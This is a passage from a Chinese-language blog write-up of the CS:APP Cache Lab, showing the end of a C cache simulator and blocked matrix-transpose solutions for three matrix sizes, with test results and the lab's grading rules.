&lt;file&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;Options:\n&quot;</span></span><br><span class="line">            <span class="string">&quot;  -h         Print this help message.\n&quot;</span></span><br><span class="line">            <span class="string">&quot;  -v         Optional verbose flag.\n&quot;</span></span><br><span class="line">            <span class="string">&quot;  -s &lt;num&gt;   Number of set index bits.\n&quot;</span></span><br><span class="line">            <span class="string">&quot;  -E &lt;num&gt;   Number of lines per set.\n&quot;</span></span><br><span class="line">            <span class="string">&quot;  -b &lt;num&gt;   Number of block offset bits.\n&quot;</span></span><br><span class="line">            <span class="string">&quot;  -t &lt;file&gt;  Trace file.\n\n&quot;</span></span><br><span class="line">            <span class="string">&quot;Examples:\n&quot;</span></span><br><span class="line">            <span class="string">&quot;  linux&gt;  ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace\n&quot;</span></span><br><span class="line">            <span class="string">&quot;  linux&gt;  ./csim-ref -v -s 8 -E 2 -b 4 -t traces/yi.trace\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> opt, temp;</span><br><span class="line">    <span class="keyword">char</span> type;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> addr;</span><br><span class="line">    hit_count = miss_count = eviction_count = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> ((opt = getopt(argc, argv, <span class="string">&quot;hvs:E:b:t:&quot;</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (opt) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">            printUsage();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">            v = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            s = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">            E = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">            b = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">            <span class="built_in">strcpy</span>(filename, optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		S = <span class="number">1</span> &lt;&lt; s;</span><br><span class="line">    init_cache();</span><br><span class="line">  </span><br><span class="line">    FILE* fp = fopen(filename, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No such file!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (fgets(buffer, <span class="number">1000</span>, fp)) &#123;</span><br><span class="line">        <span class="built_in">sscanf</span>(buffer, <span class="string">&quot; %c %xu,%d&quot;</span>, &amp;type, &amp;addr, &amp;temp);</span><br><span class="line">        <span class="keyword">switch</span>(type) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">            update(addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line">            update(addr);</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">            update(addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        update_time();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S; i++)</span><br><span class="line">        <span class="built_in">free</span>(cache[i]);</span><br><span class="line">    <span class="built_in">free</span>(cache);</span><br><span class="line">    fclose(fp);</span><br><span class="line"></span><br><span class="line">    printSummary(hit_count, miss_count, eviction_count);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="效果检测"><a href="#效果检测" class="headerlink" title="效果检测"></a>效果检测</h2><p>输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./test-csim</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">                        Your simulator     Reference simulator</span><br><span class="line">Points (s,E,b)    Hits  Misses  Evicts    Hits  Misses  Evicts</span><br><span class="line">     3 (1,1,1)       9       8       6       9       8       6  traces/yi2.trace</span><br><span class="line">     3 (4,2,4)       4       5       2       4       5       2  traces/yi.trace</span><br><span class="line">     3 (2,1,4)       2       3       1       2       3       1  traces/dave.trace</span><br><span class="line">     3 (2,1,3)     167      71      67     167      71      67  traces/trans.trace</span><br><span class="line">     3 (2,2,3)     201      37      29     201      37      29  traces/trans.trace</span><br><span class="line">     3 (2,4,3)     212      26      10     212      26      10  traces/trans.trace</span><br><span class="line">     3 (5,1,5)     231       7       0     231       7       0  traces/trans.trace</span><br><span class="line">     6 (5,1,5)  265189   21775   21743  265189   21775   21743  traces/long.trace</span><br><span class="line">    27</span><br><span class="line"></span><br><span class="line">TEST_CSIM_RESULTS=27</span><br></pre></td></tr></table></figure>
<p>成功。</p>
<h1 id="Part-B-Optimizing-Matrix-Transpose"><a href="#Part-B-Optimizing-Matrix-Transpose" class="headerlink" title="Part B: Optimizing Matrix Transpose"></a>Part B: Optimizing Matrix Transpose</h1><blockquote>
<p>在Part B中，你将在<code>trans.c</code>中编写一个转置函数，该函数将导致尽可能少的高速缓存未命中。</p>
<p>设$A$表示矩阵，$A_{ij}$表示第<code>i</code>行第<code>j</code>列的分量。$A$的转置（表示为$A^{T}$)是一个矩阵，使得$A_{ij}=A_{ji}$。</p>
<p>为了帮助你入门，我们在<code>trans.c</code>中为你提供了一个示例转置函数，该函数计算$N\times M$矩阵$A$的转置并将结果存储在$M\times N$矩阵$B$中：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> trans_desc[] = <span class="string">&quot;Simple row-wise scan transpose&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trans</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span></span><br></pre></td></tr></table></figure>

<p>示例的转置函数是正确的，但是效率很低，因为访问模式会导致相对较多的缓存未命中。</p>
<p>在Part B中，你的工作是编写一个类似的函数，称为<code>transpose_submit</code>，该函数可最大程度地减少不同大小的矩阵之间的高速缓存未命中数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> transpose_submit_desc[] = <span class="string">&quot;Transpose submission&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transpose_submit</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span>;</span><br></pre></td></tr></table></figure>

<p>不要为你的<code>transpose_submit</code>函数更改描述字符串（<code>&quot;Transpose submission&quot;</code>）。 自动分频器搜索此字符串，以确定要评估分数的转置函数。</p>
<p><strong>Programming Rules for Part B</strong></p>
<ul>
<li>在<code>trans.c</code>的标题注释中包括你的姓名和ID。</li>
<li>你在<code>trans.c</code>中的代码必须在没有<code>warnings</code>的情况下进行编译才能获得分数。</li>
<li>每个转置函数最多可以定义12个<code>int</code>类型的局部变量（出现此限制的原因是我们的测试代码无法计算对堆栈的引用。我们希望你限制对堆栈的引用，并专注于源阵列和目标阵列的访问模式）。</li>
<li>不允许通过使用<code>long</code>类型的任何变量或使用任何技巧将多个值存储到单个变量中来回避上一条规则。</li>
<li>你的转置功能可能不使用递归。</li>
<li>如果选择使用辅助函数，则在辅助函数和顶级转置函数之间，一次最多不能有12个局部变量在堆栈上。例如，如果你的转置声明了8个变量，然后又调用了一个使用4个变量的函数，又调用了一个使用2个变量的函数，则堆栈上将有14个变量，这将违反该规则。</li>
<li>你的转置函数可能不会修改数组<code>A</code>。但是，你可以对数组<code>B</code>的内容做任何想做的事情。</li>
<li>不允许在代码中定义任何数组或使用<code>malloc</code>的任何变体。</li>
</ul>
</blockquote>
<p>需要做的，就是在<code>transpose_submit</code>函数中实现三种规模矩阵A的转置运算，使不命中的次数尽可能少。</p>
<p>根据注释“*A transpose function is evaluated by counting the number of misses on a 1KB direct mapped cache with a block size of 32 bytes.*”可知：</p>
<ul>
<li><p>cache的大小为1 024字节</p>
</li>
<li><p>每块大小为32字节</p>
<p><code>int</code>型为4字节大小，则每块可以存放8个<code>int</code>型数据。</p>
</li>
<li><p>为直接映射高速缓存</p>
</li>
</ul>
<p>故缓存组有1 024/32=32组。</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><strong>注意矩阵A的行数是N！！！</strong></p>
<p>由于矩阵是以行序为主序进行存储的，所以当连续地读取矩阵A时，一定会造成不连续地写入B。</p>
<p>但是当矩阵很小时，在冷不命中之后，整个矩阵都会被加载进入缓存，此时就一定会命中。（实际上矩阵很大，不要抱有这种幻想。）</p>
<p>所以我们需要对矩阵进行分块处理，将一个个小的矩阵加载进入缓存，以其较好的局部性来提高程序性能。</p>
<p>根据cache的大小（共32组，每组可存8个<code>int</code>，一共可存32*8=256个<code>int</code>）：</p>
<ul>
<li><p>对于32*32的矩阵A和B，A的前8行可以存放在cache中，而第9行、第17行、第25行一定会与A的第一行发生冲突不命中；同时由于B是紧接着A进行存储的，所以B的第1行、第9行、第17行、第25行也一定会与A的第一行发生冲突不命中。即，<strong>读取两个相差8行的<code>int</code>时一定会发生冲突不命中</strong>。</p>
<p>不仅如此，由于矩阵规模都是8的倍数，还可以发现<strong>B的第i行一定会与A的第i行发生冲突不命中</strong>。虽然读一行A之后会写一列而不是一行B，但位于<strong>对角线上的元素一定会发生冲突不命中</strong>。</p>
</li>
<li><p>对于64*64的同理。</p>
</li>
</ul>
<h2 id="if-M-32"><a href="#if-M-32" class="headerlink" title="if (M == 32)"></a><code>if (M == 32)</code></h2><p>由于cache最多可以存8行32列个<code>int</code>，所以选择8*8的分块，将矩阵分成4*4=16个小矩阵。</p>
<p>对于A中第一个小矩阵，当读取第一个<code>int</code>时，这一行的8个<code>int</code>都会加载入一个缓存块中。此时再写入B的第一个小矩阵的第一列，B的这一行的8个<code>int</code>会再次加载入同一个缓存块中，必发生冲突不命中。</p>
<p>然后我们还要读取A的小矩阵的第二个<code>int</code>，此时又会和B发生冲突不命中……</p>
<p>这是由于同时访问A和B的对角线元素导致的抖动，所以当读取A的第一个小矩阵的第一个<code>int</code>时，既然这一行都缓存了，那就干脆直接将这一行的8个<code>int</code>都一次性读取，再一次性写入B的第一个小矩阵的第一列，这样就不会出现反复的冲突不命中了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> row_head, col_head;</span><br><span class="line"><span class="keyword">int</span> tmp0, tmp1, tmp2, tmp3, tmp4, tmp5, tmp6, tmp7;</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"><span class="keyword">for</span> (row_head = <span class="number">0</span>; row_head &lt; N; row_head += <span class="number">8</span>)</span><br><span class="line">  <span class="keyword">for</span> (col_head = <span class="number">0</span>; col_head &lt; M; col_head += <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">for</span> (i = row_head; i &lt; row_head + <span class="number">8</span>; i++) &#123;</span><br><span class="line">      tmp0 = A[i][col_head];</span><br><span class="line">      tmp1 = A[i][col_head + <span class="number">1</span>];</span><br><span class="line">      tmp2 = A[i][col_head + <span class="number">2</span>];</span><br><span class="line">      tmp3 = A[i][col_head + <span class="number">3</span>];</span><br><span class="line">      tmp4 = A[i][col_head + <span class="number">4</span>];</span><br><span class="line">      tmp5 = A[i][col_head + <span class="number">5</span>];</span><br><span class="line">      tmp6 = A[i][col_head + <span class="number">6</span>];</span><br><span class="line">      tmp7 = A[i][col_head + <span class="number">7</span>];</span><br><span class="line">      </span><br><span class="line">      B[col_head][i] = tmp0;</span><br><span class="line">      B[col_head + <span class="number">1</span>][i] = tmp1;</span><br><span class="line">      B[col_head + <span class="number">2</span>][i] = tmp2;</span><br><span class="line">      B[col_head + <span class="number">3</span>][i] = tmp3;</span><br><span class="line">      B[col_head + <span class="number">4</span>][i] = tmp4;</span><br><span class="line">      B[col_head + <span class="number">5</span>][i] = tmp5;</span><br><span class="line">      B[col_head + <span class="number">6</span>][i] = tmp6;</span><br><span class="line">      B[col_head + <span class="number">7</span>][i] = tmp7;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>测试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./test-trans -M 32 -N 32 </span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Function 0 (1 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 0 (Transpose submission): hits:1766, misses:287, evictions:255</span><br><span class="line"></span><br><span class="line">Summary <span class="keyword">for</span> official submission (func 0): correctness=1 misses=287</span><br><span class="line"></span><br><span class="line">TEST_TRANS_RESULTS=1:287</span><br></pre></td></tr></table></figure>
<p>miss次数已经降到287了，小于300，成功。</p>
<h2 id="if-M-64"><a href="#if-M-64" class="headerlink" title="if (M == 64)"></a><code>if (M == 64)</code></h2><p>对于64*64的矩阵，cache最多可以存储4行。若仍按8*8分块，则A自身就会出现冲突不命中（隔4行），显然不行。</p>
<p>类比一下，我们可以用4*4的分块吗？</p>
<p>因为一个缓存块就可以存8个<code>int</code>，只用4个的话太浪费了，也不行。</p>
<p>那么，既然大矩阵可以分块，那么小矩阵也可以分块啊！</p>
<p>我们对8*8的小矩阵分成4个4*4的小小矩阵，左上角和右下角的转置算法不变，只需要处理一下左下角和右上角的转置。</p>
<ul>
<li><p>上半部分（4行8列）：</p>
<p>一次性读A的小矩阵一行（8个），读4次，每次的前4个（左上角）存入B的小小矩阵的左上角一列。这是左上角的正常转置。</p>
<p>每次的后4个（右上角）为了不冲突，不能存入B的左下角；为了不浪费，可以暂时存到B的右上角一列（由于左上角转置结束，此时的上半部分对应的缓存块已经全是B了）。这时B的右上角是B的左下角最终的状态。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = row_head; i &lt; row_head + <span class="number">4</span>; i++) &#123;</span><br><span class="line">  tmp0 = A[i][col_head];</span><br><span class="line">  tmp1 = A[i][col_head + <span class="number">1</span>];</span><br><span class="line">  tmp2 = A[i][col_head + <span class="number">2</span>];</span><br><span class="line">  tmp3 = A[i][col_head + <span class="number">3</span>];</span><br><span class="line">  tmp4 = A[i][col_head + <span class="number">4</span>];</span><br><span class="line">  tmp5 = A[i][col_head + <span class="number">5</span>];</span><br><span class="line">  tmp6 = A[i][col_head + <span class="number">6</span>];</span><br><span class="line">  tmp7 = A[i][col_head + <span class="number">7</span>];</span><br><span class="line">  </span><br><span class="line">  B[col_head][i] = tmp0;</span><br><span class="line">  B[col_head + <span class="number">1</span>][i] = tmp1;</span><br><span class="line">  B[col_head + <span class="number">2</span>][i] = tmp2;</span><br><span class="line">  B[col_head + <span class="number">3</span>][i] = tmp3;</span><br><span class="line">  </span><br><span class="line">  B[col_head][i + <span class="number">4</span>] = tmp4;</span><br><span class="line">  B[col_head + <span class="number">1</span>][i + <span class="number">4</span>] = tmp5;</span><br><span class="line">  B[col_head + <span class="number">2</span>][i + <span class="number">4</span>] = tmp6;</span><br><span class="line">  B[col_head + <span class="number">3</span>][i + <span class="number">4</span>] = tmp7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>下半部分（4行8列）：</p>
<p>需要将A左下角的转置存入B的右上角，将刚才暂存在B右上角的实际左下角的状态平移到B的左下角。</p>
<p>一次性读A的小矩阵一行（8个），读4次，每次的后4个（右下角）存入B的小小矩阵的右下角一列。这是右下角的正常转置。</p>
<p>每次的前4个（左下角）需要存到B的右上角，但是此时B的右上角还没取出来，此时变量个数已经达到上限，导致算法无法继续进行。一定是哪里出了问题。</p>
<p>分析发现，每次取出B右上角需要4个变量，所以每次就剩下4个变量可供A转置使用。所以每次次只能读A的小一行（4个）、对应B右上角的小一列（也可以是A的小一列、B的小一行）。</p>
<p>总结可以发现，A每读一行需要写B的一列、读一列需要写B的一行，所以这两种方式为后续操作造成的冲突次数是等价的。但是因为需要将B从右上角平移到左下角，即读一行就对应写一行、读一列就对应写一列，所以明显读一行导致的冲突次数更少。</p>
<p>综上，处理A的左下角时，先读A的小一列、B右上角的小一行，再将A的左下角小一列存入B的右上角小一行，再将B右上角的小一行存入B左下角的小一行。</p>
<p>A的右下角正常转置（因为取列，无法避免冲突，所以直接赋值即可）。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (j = col_head; j &lt; col_head + <span class="number">4</span>; j++) &#123;</span><br><span class="line">  tmp4 = A[row_head + <span class="number">4</span>][j];</span><br><span class="line">  tmp5 = A[row_head + <span class="number">5</span>][j];</span><br><span class="line">  tmp6 = A[row_head + <span class="number">6</span>][j];</span><br><span class="line">  tmp7 = A[row_head + <span class="number">7</span>][j];</span><br><span class="line">  </span><br><span class="line">  tmp0 = B[j][row_head + <span class="number">4</span>];</span><br><span class="line">  tmp1 = B[j][row_head + <span class="number">5</span>];</span><br><span class="line">  tmp2 = B[j][row_head + <span class="number">6</span>];</span><br><span class="line">  tmp3 = B[j][row_head + <span class="number">7</span>];</span><br><span class="line">  </span><br><span class="line">  B[j][row_head + <span class="number">4</span>] = tmp4;</span><br><span class="line">  B[j][row_head + <span class="number">5</span>] = tmp5;</span><br><span class="line">  B[j][row_head + <span class="number">6</span>] = tmp6;</span><br><span class="line">  B[j][row_head + <span class="number">7</span>] = tmp7;</span><br><span class="line">  </span><br><span class="line">  B[j + <span class="number">4</span>][row_head] = tmp0;</span><br><span class="line">  B[j + <span class="number">4</span>][row_head + <span class="number">1</span>] = tmp1;</span><br><span class="line">  B[j + <span class="number">4</span>][row_head + <span class="number">2</span>] = tmp2;</span><br><span class="line">  B[j + <span class="number">4</span>][row_head + <span class="number">3</span>] = tmp3;</span><br><span class="line">  </span><br><span class="line">  B[j + <span class="number">4</span>][row_head + <span class="number">4</span>] = A[row_head + <span class="number">4</span>][j + <span class="number">4</span>];</span><br><span class="line">  B[j + <span class="number">4</span>][row_head + <span class="number">5</span>] = A[row_head + <span class="number">5</span>][j + <span class="number">4</span>];</span><br><span class="line">  B[j + <span class="number">4</span>][row_head + <span class="number">6</span>] = A[row_head + <span class="number">6</span>][j + <span class="number">4</span>];</span><br><span class="line">  B[j + <span class="number">4</span>][row_head + <span class="number">7</span>] = A[row_head + <span class="number">7</span>][j + <span class="number">4</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试：</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./test-trans -M 64 -N 64 </span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Function 0 (1 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 0 (Transpose submission): hits:9074, misses:1171, evictions:1139</span><br><span class="line"></span><br><span class="line">Summary <span class="keyword">for</span> official submission (func 0): correctness=1 misses=1171</span><br><span class="line"></span><br><span class="line">TEST_TRANS_RESULTS=1:1171</span><br></pre></td></tr></table></figure>
<p>miss次数已经降到了1 171，小于1 300，成功。</p>
<h2 id="if-M-61"><a href="#if-M-61" class="headerlink" title="if (M == 61)"></a><code>if (M == 61)</code></h2><p>由于不规则矩阵没有明显的规律，可以尝试不同分块。</p>
<p>下面采用16*16分块。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(row_head = <span class="number">0</span>; row_head + <span class="number">16</span> &lt; N; row_head += <span class="number">16</span>)</span><br><span class="line">		<span class="keyword">for</span>(col_head = <span class="number">0</span>; col_head + <span class="number">16</span> &lt; M; col_head += <span class="number">16</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>(i = row_head; i &lt; row_head + <span class="number">16</span>; i++)</span><br><span class="line">			&#123;</span><br><span class="line">				tmp0 = A[i][col_head + <span class="number">0</span>];</span><br><span class="line">				tmp1 = A[i][col_head + <span class="number">1</span>];</span><br><span class="line">				tmp2 = A[i][col_head + <span class="number">2</span>];</span><br><span class="line">				tmp3 = A[i][col_head + <span class="number">3</span>];</span><br><span class="line">				tmp4 = A[i][col_head + <span class="number">4</span>];</span><br><span class="line">				tmp5 = A[i][col_head + <span class="number">5</span>];</span><br><span class="line">				tmp6 = A[i][col_head + <span class="number">6</span>];</span><br><span class="line">				tmp7 = A[i][col_head + <span class="number">7</span>];</span><br><span class="line">				B[col_head + <span class="number">0</span>][i] = tmp0;</span><br><span class="line">				B[col_head + <span class="number">1</span>][i] = tmp1;</span><br><span class="line">				B[col_head + <span class="number">2</span>][i] = tmp2;</span><br><span class="line">				B[col_head + <span class="number">3</span>][i] = tmp3;</span><br><span class="line">				B[col_head + <span class="number">4</span>][i] = tmp4;</span><br><span class="line">				B[col_head + <span class="number">5</span>][i] = tmp5;</span><br><span class="line">				B[col_head + <span class="number">6</span>][i] = tmp6;</span><br><span class="line">				B[col_head + <span class="number">7</span>][i] = tmp7;</span><br><span class="line"></span><br><span class="line">				tmp0 = A[i][col_head + <span class="number">8</span>];</span><br><span class="line">				tmp1 = A[i][col_head + <span class="number">9</span>];</span><br><span class="line">				tmp2 = A[i][col_head + <span class="number">10</span>];</span><br><span class="line">				tmp3 = A[i][col_head + <span class="number">11</span>];</span><br><span class="line">				tmp4 = A[i][col_head + <span class="number">12</span>];</span><br><span class="line">				tmp5 = A[i][col_head + <span class="number">13</span>];</span><br><span class="line">				tmp6 = A[i][col_head + <span class="number">14</span>];</span><br><span class="line">				tmp7 = A[i][col_head + <span class="number">15</span>];</span><br><span class="line">				B[col_head + <span class="number">8</span>][i] = tmp0;</span><br><span class="line">				B[col_head + <span class="number">9</span>][i] = tmp1;</span><br><span class="line">				B[col_head + <span class="number">10</span>][i] = tmp2;</span><br><span class="line">				B[col_head + <span class="number">11</span>][i] = tmp3;</span><br><span class="line">				B[col_head + <span class="number">12</span>][i] = tmp4;</span><br><span class="line">				B[col_head + <span class="number">13</span>][i] = tmp5;</span><br><span class="line">				B[col_head + <span class="number">14</span>][i] = tmp6;</span><br><span class="line">				B[col_head + <span class="number">15</span>][i] = tmp7;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">for</span>(i = row_head; i &lt; N; i++)</span><br><span class="line">		<span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; M; j++)</span><br><span class="line">			B[j][i] = A[i][j];</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; row_head; i++)</span><br><span class="line">		<span class="keyword">for</span>(j = col_head; j &lt; M; j++)</span><br><span class="line">			B[j][i] = A[i][j];</span><br></pre></td></tr></table></figure>
<p>测试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./test-trans -M 61 -N 67</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Function 0 (1 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 0 (Transpose submission): hits:6216, misses:1963, evictions:1931</span><br><span class="line"></span><br><span class="line">Summary <span class="keyword">for</span> official submission (func 0): correctness=1 misses=1963</span><br><span class="line"></span><br><span class="line">TEST_TRANS_RESULTS=1:1963</span><br></pre></td></tr></table></figure>
<p>miss次数为1 963，小于2 000，成功。</p>
<h1 id="Evaluation"><a href="#Evaluation" class="headerlink" title="Evaluation"></a>Evaluation</h1><p>本节介绍如何评估你的工作，该实验的总分是60分：</p>
<ul>
<li>Part A: 27 Points</li>
<li>Part B: 26 Points</li>
<li>Style: 7 Points</li>
</ul>
<h2 id="Evaluation-for-Part-A"><a href="#Evaluation-for-Part-A" class="headerlink" title="Evaluation for Part A"></a>Evaluation for Part A</h2><p>对于Part A，我们将使用不同的缓存参数和跟踪来运行你的缓存模拟器。有8个测试用例，每个3分，最后一个用例除外，6分：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">linux&gt;</span><span class="bash"> ./csim -s 1 -E 1 -b 1 -t traces/yi2.trace linux&gt; ./csim -s 4 -E 2 -b 4 -t traces/yi.trace linux&gt; ./csim -s 2 -E 1 -b 4 -t traces/dave.trace</span></span><br><span class="line"><span class="meta">linux&gt;</span><span class="bash"> ./csim -s 2 -E 1 -b 3 -t traces/trans.trace</span></span><br><span class="line"><span class="meta">linux&gt;</span><span class="bash"> ./csim -s 2 -E 2 -b 3 -t traces/trans.trace</span></span><br><span class="line"><span class="meta">linux&gt;</span><span class="bash"> ./csim -s 2 -E 4 -b 3 -t traces/trans.trace</span></span><br><span class="line"><span class="meta">linux&gt;</span><span class="bash"> ./csim -s 5 -E 1 -b 5 -t traces/trans.trace</span></span><br><span class="line"><span class="meta">linux&gt;</span><span class="bash"> ./csim -s 5 -E 1 -b 5 -t traces/long.trace</span></span><br></pre></td></tr></table></figure>
<p>你可以使用参考模拟器<code>csim-ref</code>为每个测试用例获得正确的答案。在调试期间，请使用<code>-v</code>选项详细记录每次命中和未命中。</p>
<p>对于每个测试用例，输出正确数量的缓存命中、未命中和逐出将使你对该测试用例有充分的了解。 你报告的每次命中、未命中和逐出的次数都相当于该测试用例的1/3功劳。 也就是说，如果特定测试用例价值3分，并且你的模拟器输出正确的命中率和未命中数，但是报告了错误的驱逐数，那么你将获得2分。</p>
<h2 id="Evaluation-for-Part-B"><a href="#Evaluation-for-Part-B" class="headerlink" title="Evaluation for Part B"></a>Evaluation for Part B</h2><p>对于Part B，我们将在三种不同大小的输出矩阵上评估你的<code>transpose_submit</code>函数的正确性和性能：</p>
<ul>
<li>32×32(M = 32, N = 32)</li>
<li>64×64(M = 64, N = 64)</li>
<li>61×67(M = 61, N = 67)</li>
</ul>
<p>对于每种矩阵大小，通过使用<code>valgrind</code>提取函数的地址跟踪，然后使用参考模拟器在具有参数（s = 5，E = 1，b= 5）的高速缓存上重放此跟踪，可以评估<code>transpose_submit</code>函数的性能。</p>
<p>你对每种矩阵大小的性能得分与未命中数<code>m</code>具有线性关系，直至某个阈值：</p>
<ul>
<li>32×32: 8 points if <code>m</code> &lt; 300, 0 points if <code>m</code> &gt; 600</li>
<li>64×64: 8 points if <code>m</code> &lt; 1,300, 0 points if <code>m</code> &gt; 2,000</li>
<li>61×67: 10 points if <code>m</code> &lt; 2,000, 0 points if <code>m</code> &gt; 3,000</li>
</ul>
<p>你的代码必须正确才能接收特定大小的任何性能分。你的代码只需要针对这三种情况是正确的，并且可以针对这三种情况专门对其进行优化。特别地，函数可以明确检查输入大小并实现针对每种情况优化的单独代码，这是完全可以的。</p>
<h2 id="Evaluation-for-Style"><a href="#Evaluation-for-Style" class="headerlink" title="Evaluation for Style"></a>Evaluation for Style</h2><p>代码风格有7分。这些将由教师手动分配。风格指南可在课程网站上找到。</p>
<p>教师将检查Part B中的代码是否存在非法数组和过多的局部变量。</p>
<h1 id="Working-on-the-Lab"><a href="#Working-on-the-Lab" class="headerlink" title="Working on the Lab"></a>Working on the Lab</h1><h2 id="Working-on-Part-A"><a href="#Working-on-Part-A" class="headerlink" title="Working on Part A"></a>Working on Part A</h2><p>我们为你提供了一个称为<code>test-csim</code>的自动分级程序，该程序可以在线上测试缓存模拟器的正确性。在运行测试之前，请确保编译模拟器：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">linux&gt;</span><span class="bash"> make</span></span><br><span class="line"><span class="meta">linux&gt;</span><span class="bash"> ./test-csim</span></span><br><span class="line">                      Your simulator Reference simulator</span><br><span class="line">Points (s,E,b)    Hits Misses Evicts   Hits Misses Evicts</span><br><span class="line">     3 (1,1,1)       9      8      6      9      8      6  traces/yi2.trace</span><br><span class="line">     3 (4,2,4)       4      5      2      4      5      2  traces/yi.trace</span><br><span class="line">     3 (2,1,4)       2      3      1      2      3      1  traces/dave.trace</span><br><span class="line">     3 (2,1,3)     167     71     67    167     71     67  traces/trans.trace</span><br><span class="line">     3 (2,2,3)     201     37     29    201     37     29  traces/trans.trace</span><br><span class="line">     3 (2,4,3)     212     26     10    212     26     10  traces/trans.trace</span><br><span class="line">     3 (5,1,5)     231      7      0    231      7      0  traces/trans.trace</span><br><span class="line">     6 (5,1,5)  265189  21775  21743 265189  21775  21743  traces/long.trace</span><br><span class="line">    27</span><br></pre></td></tr></table></figure>
